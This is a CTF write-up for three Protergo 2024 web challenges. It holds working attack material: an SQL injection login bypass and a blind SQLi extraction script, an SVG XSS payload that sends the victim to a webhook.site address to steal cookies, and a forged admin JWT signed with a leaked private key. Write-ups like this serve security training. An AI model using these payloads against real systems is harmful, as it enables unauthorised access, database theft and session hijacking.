---
title: Protergo CTF
date: 2024-02-08 00:00:00 +/-TTTT
categories: [CTFs Archive, 2024 CTF]
tags: [CTFs]     # TAG names should always be lowercase
comments: true
toc: true
mermaid: true
img_path: /protergo%20ctf
---
# Protergo CTF

2024 Protergo CTF, 7 Days CTF Challenges by Protergo
- Tags: national
- Status: Done
- pwned: 3

## Jumper

`url : tokyo.ctf.protergo.party:10002`
### Analyze
Given a web service containing a simple login page. By performing a simple SQL injection bypass, we successfully bypassed the login using the payload `' or 1=1 -- -`.

![Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled.png](Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled.png)

This redirected us to the dashboard.

![Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%201.png](Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%201.png)

From here, I performed blind SQL injection to dump the table. The request flow is as follows: the website generates a token, which is then used to post login data, so we need to retrieve the token every time we send a query.

![Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%202.png](Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%202.png)

From there, it's just a matter of creating the following simple script.
### Solver
```python
import requests
import re
import base64

url = "http://tokyo.ctf.protergo.party:10002/"
cookie = {"laravel_session":"w8DdHi4IgwEMV5lWoKnppOOxWgH5nGBXVYGZDddb;"}
payload = {"username": "asd' -- -",
          "password":"asd' -- -"}

def get_token():
    token = url +  "api/token"
    res = requests.get(token, cookies=cookie)
    return res.json()['data']['token']

def check2(data):
   print(data.text)
   return re.search("true", data.text)

def blind(kolom,table):
   login = url + "api/login"
   passwd = ""
   idx = 1

   while (True):
       lo = 1
       hi = 255
       temp = -1
       while(lo <= hi):
           mid = (lo + hi) // 2
           payload["username"] = base64.b64encode("' OR ((SELECT ASCII(SUBSTR({},{},1)) {}) <= {})-- -".format(str(kolom),str(idx),str(table),str(mid)).encode('utf-8')).decode('utf-8')
           
           payload["password"] = base64.b64encode("test".encode('utf-8')).decode('utf-8')
           payload["token"] = get_token()
           print (payload)
           res = requests.post(login,data=payload, cookies=cookie)
           if check2(res):
               hi = mid-1
               temp = mid
           else:
               lo = mid+1
       if (hi == 0): break
       print(temp)
       passwd += chr(temp)
       res = ""
       print("Result [{}]: {}".format(table,passwd))
       idx += 1
  
   return passwd

# blind("user()","")
# root@172.21.0.2
# blind("group_concat(table_name)", "FROM infoRmation_schema.tables where table_schema!=0x696e666f726d6174696f6e5f736368656d61")
# Result: flag,login,...
# blind("group_concat(column_name)", "FROM infoRmation_schema.columns where table_name='flag'")
# Result: fl4g_c0lumN5,id
```

1. **Setup:**
    - The script uses the **`requests`**, **`re`**, and **`base64`** libraries in Python.
    - The target URL is set to "[tokyo.ctf.protergo.party:10002/](tokyo.ctf.protergo.party:10002/)".
    - A cookie is specified as **`{"laravel_session": "w8DdHi4IgwEMV5lWoKnppOOxWgH5nGBXVYGZDddb;"}`**.
2. **Functions:**
    - **get_token():**
        - Sends a GET request to "api/token" to retrieve a token from the server.
        - Extracts the token from the JSON response and returns it.
    - **check2(data):**
        - Prints the response text.
        - Searches for the string "true" in the response text.
        - Returns **`True`** if "true" is found; otherwise, returns **`None`**.
    - **blind(kolom, table):**
        - Conducts a blind SQL injection to extract information from the database.
        - Uses a binary search to find the ASCII values of characters in a specified column and table.
        - Modifies the **`payload["username"]`** with a base64-encoded SQL injection payload.
        - The payload attempts to extract information character by character from the specified column and table.
        - Uses the **`get_token()`** function to retrieve a token for each request.
        - Prints the payload and response for debugging purposes.
        - Extracts ASCII values character by character and builds a password.
        - Prints the result for each character and continues until the entire password is extracted.
        - Returns the extracted password.

When attempting to dump data, I encountered an issue where the query to dump columns was unsuccessful. As a result, I modified the payload

```python

		payload["username"] = base64.b64encode(
			"' OR ASCII(SUBSTRING((SELECT {} FROM {} LIMIT 1), {}, 1)) <= {}-- -".format(
      str(kolom), str(table), str(idx), str(mid)
	  ).encode('utf-8')
).decode('utf-8')

blind("group_concat(fl4g_c0lumN5,id)", "flag")
```
### Flag
`PROTERGO{f0ac7b6358cf6269dc59819c1bf3019fc6fcc2c5f5567b8187eae87d51f25e8c}`

## Control

`url: ctf.protergo.party:10001`
### Analyze

"There is a website for registration, based on the available description, there is a high likelihood of XSS.

![Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%203.png](Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%203.png)

After a while, I realized that the file upload feature during registration can be injected using SVG like the following:

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/>
<svg version="1.1" baseProfile="full" >
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400>
   <script type="text/javascript">
      alert(document.domain);
   </script>
</svg>

```

Next, we can try to retrieve its cookies to obtain the flag."
### Solver

```html

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;strok>
   <script type="text/javascript">
      document.location.href = 'https://webhook.site/1c522f3a-fb3d-4bf4-8163-51>
   </script>
</svg>
```

![Untitled](Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%204.png)
### Flag
`PROTERGO{57d64a838c5158de42a706bf1e0195ee27406d551d29a217ed0706e8347824b0}`

## **Just Wiggle Toes**
`url: jakarta.ctf.protergo.party:10003`
### Analyze
Given a web service with no visible functionality, we need to perform reconnaissance and enumeration. There is a hint provided.

![Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%205.png](Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%205.png)

### Enumeration
Next, I tried enumeration with ffuf. Since the web is very slow, I divided the directory list file into 22 parts with the following script:

```python
import os

def split_wordlist(input_file, output_dir, lines_per_file):
    with open(input_file, 'r', encoding='utf-8') as infile:
        lines = infile.readlines()

    total_lines = len(lines)
    files_count = total_lines // lines_per_file + (total_lines % lines_per_file > 0)

    for i in range(files_count):
        start_index = i * lines_per_file
        end_index = min((i + 1) * lines_per_file, total_lines)

        output_file = os.path.join(output_dir, f'wordlist_part_{i + 1}.txt')

        with open(output_file, 'w', encoding='utf-8') as outfile:
            outfile.writelines(lines[start_index:end_index])

        print(f'File {output_file} created with {end_index - start_index} lines.')

if __name__ == "__main__":
    input_wordlist = "directory-list-2.3-medium.txt"  # Replace with your wordlist file name
    output_directory = "./wordlists"  # Replace with the directory to store the result files

    lines_per_file = 10000

    if not os.path.exists(output_directory):
        os.makedirs(output_directory)

    split_wordlist(input_wordlist, output_directory, lines_per_file)

```

Then, enumerate using ffuf. It was found that wordlist parts 17 and 19 obtained different endpoints.

![Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%206.png](Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%206.png)

![Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%207.png](Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%207.png)

`/LittleSecrets`

![Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%208.png](Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%208.png)

There is a private jwt.pem that can be decrypted using a passphrase to be used for login next.

`/portal_login`

![Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%209.png](Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%209.png)

The login feature, when registering, will provide an authentication cookie that can be used as an example to be recreated on [jwt.io](https://jwt.io/). Then, you can log in using that JWT and access the home with the `auth` JWT token cookie.
### Solver
```python
import jwt
import requests
from datetime import datetime, timedelta
import re

with open("private-decrypted.pem", "rb") as f:
   private_key = f.read()

base_url = "http://jakarta.ctf.protergo.party:10003/"

def craft_token():
   payload = {
         "iss": "admin",
         "iat": datetime.utcnow(),
         "exp": datetime.utcnow() + timedelta(seconds=18000),
         "is_admin": 1,
         "sub": "12",
         "jti": "65c08f9dd7459"
      } 

   jwt_token = jwt.encode(payload, private_key, algorithm="RS256")
   return jwt_token

def login(token):
   header = {
      "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36"
    }
   cookie = {
      "XSRF-TOKEN":"eyJpdiI6IlNYWkVFLzlkOE1vbEtyNHJsYnhaaVE9PSIsInZhbHVlIjoieVlaM1pzRmhEWHJPUFdqMTlFZVVyRGxvMXh0VEx2WFJyeG00Q0l3NFFyTXNWMjJZeTJmTW1NWVlNTXZXZENVMk9haStSb3lnSTR3OUFuaXMzeUlhNE9CNlNRdStFcy9QUW9CVHcxWjFrUHhrSWUwMlliNk9sTWZGQmZVdTlEZ1EiLCJtYWMiOiI3YWI1YzFmMGNkNDVjMTgzMGVhYmM4Yjc1OGU1ZjU1ZDA4ZjJlMWM5ZDEyMjBhY2FkM2NhODM4YjAwZWEyOTM2IiwidGFnIjoiIn0%3D;",
      "laravel_session":"eyJpdiI6Ik1VdTNDbGp4Y0Zpb080ZFpNMUNhU1E9PSIsInZhbHVlIjoiTTRybEpJNGRQdjg3aytWOXkwN3JMelZMeTNsa3BGWVZrcm03cHBuaEdkVGgzN0FDYnhkQXhneThLRXhqZUJab2lGZ25kdy9KYXByZ20wV1FKQ3MvbitvbmdnVUo0QlB5N3RDRFFuMUttd2NyK2J6bFhzQWIwYXdTMjB4ZnRrNkUiLCJtYWMiOiJmMTY0MTY3NjIwMmJlZWYyMDY5YjM0ODUzNjMyNDUxNjZmZTdiNzAyZTk5ZDQ3MzU4MjBiMmYzOGQ3OGY1MzA3IiwidGFnIjoiIn0%3D",
      "auth":f"{token}"
    }
   r = requests.get(base_url + "home", cookies=cookie, headers=header)
   
   return r
if __name__=="__main__":
   req = login(craft_token())
   print(re.findall(r'PROTERGO\{.*\}', req.text))
```

![Untitled](Protergo%20CTF%20a0136568816c40fea9a8d66ccba3460f/Untitled%2010.png)
### Flag
`PROTERGO{f5016c424def47159321869c8e7ff4cac79b9e721c0d700cf7c0c8ab7f43b203}`